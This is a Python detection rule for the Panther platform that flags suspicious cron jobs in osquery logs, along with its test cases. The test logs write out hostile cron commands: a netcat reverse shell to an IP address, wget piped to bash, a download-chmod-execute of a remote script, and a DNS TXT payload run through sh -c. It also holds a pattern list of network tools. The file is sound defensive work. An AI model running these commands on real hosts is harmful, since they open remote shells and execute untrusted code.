import shlex
from fnmatch import fnmatch

from pypanther import LogType, Rule, RuleTest, Severity, panther_managed


@panther_managed
class OsquerySuspiciousCron(Rule):
    id = "Osquery.SuspiciousCron-prototype"
    display_name = "Suspicious cron detected"
    log_types = [LogType.OSQUERY_DIFFERENTIAL]
    tags = ["Osquery", "Execution:Scheduled Task/Job"]
    reports = {"MITRE ATT&CK": ["TA0002:T1053"]}
    default_severity = Severity.HIGH
    default_description = "A suspicious cron has been added"
    default_runbook = "Analyze the command to ensure no nefarious activity is occurring"
    default_reference = "https://en.wikipedia.org/wiki/Cron"
    summary_attributes = ["action", "hostIdentifier", "name"]
    # Running in unexpected locations
    # nosec
    # Reaching out to the internet
    SUSPICIOUS_CRON_CMD_ARGS = {"/tmp/*", "curl", "dig", "http?://*", "nc", "wget"}
    # Passing arguments into /bin/sh
    SUSPICIOUS_CRON_CMDS = {"*|*sh", "*sh -c *"}

    def suspicious_cmd_pairs(self, command):
        return any(fnmatch(command, c) for c in self.SUSPICIOUS_CRON_CMDS)

    def suspicious_cmd_args(self, command):
        command_args = shlex.split(command.replace("'", "\\'"))  # escape single quotes
        for cmd in command_args:
            if any(fnmatch(cmd, c) for c in self.SUSPICIOUS_CRON_CMD_ARGS):
                return True
        return False

    def rule(self, event):
        if "crontab" not in event.get("name"):
            return False
        command = event.deep_get("columns", "command")
        if not command:
            return False
        return any([self.suspicious_cmd_args(command), self.suspicious_cmd_pairs(command)])

    def title(self, event):
        return f"Suspicious cron found on [{event.get('hostIdentifier', '<UNKNOWN_HOST>')}]"

    tests = [
        RuleTest(
            name="Netcat Listener",
            expected_result=True,
            log={
                "name": "pack_incident-response_crontab",
                "hostIdentifier": "test-host",
                "action": "added",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": "nc -e /bin/bash 237.233.242.58 80",
                    "path": "/etc/crontab",
                },
            },
        ),
        RuleTest(
            name="Wget Pipe Bash",
            expected_result=True,
            log={
                "name": "pack_incident-response_crontab",
                "action": "added",
                "hostIdentifier": "test-host",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": "wget -qO- -U- https://sd9fd8f9d8fe.io/i.sh|bash >/dev/null 2>&1",
                    "path": "/etc/crontab",
                },
            },
        ),
        RuleTest(
            name="Wget Execute",
            expected_result=True,
            log={
                "name": "pack_incident-response_crontab",
                "action": "added",
                "hostIdentifier": "test-host",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": "wget -O /tmp/load.sh http://test[.]io/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.log",
                    "path": "/etc/crontab",
                },
            },
        ),
        RuleTest(
            name="Dig",
            expected_result=True,
            log={
                "name": "pack_incident-response_crontab",
                "action": "added",
                "hostIdentifier": "test-host",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": '/bin/sh -c "sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)"',
                    "path": "/etc/crontab",
                },
            },
        ),
        RuleTest(
            name="Built-in Cron",
            expected_result=False,
            log={
                "name": "pack_incident-response_crontab",
                "action": "added",
                "hostIdentifier": "test-host",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": "root cd / && run-parts --report /etc/cron.hourly",
                    "path": "/etc/crontab",
                },
            },
        ),
        RuleTest(
            name="Command with quotes",
            expected_result=False,
            log={
                "name": "pack_incident-response_crontab",
                "action": "added",
                "hostIdentifier": "test-host",
                "columns": {
                    "event": "",
                    "minute": "17",
                    "hour": "*",
                    "day_of_month": "*",
                    "month": "*",
                    "day_of_week": "7",
                    "command": "runit 'go fast'",
                    "path": "/etc/crontab",
                },
            },
        ),
    ]
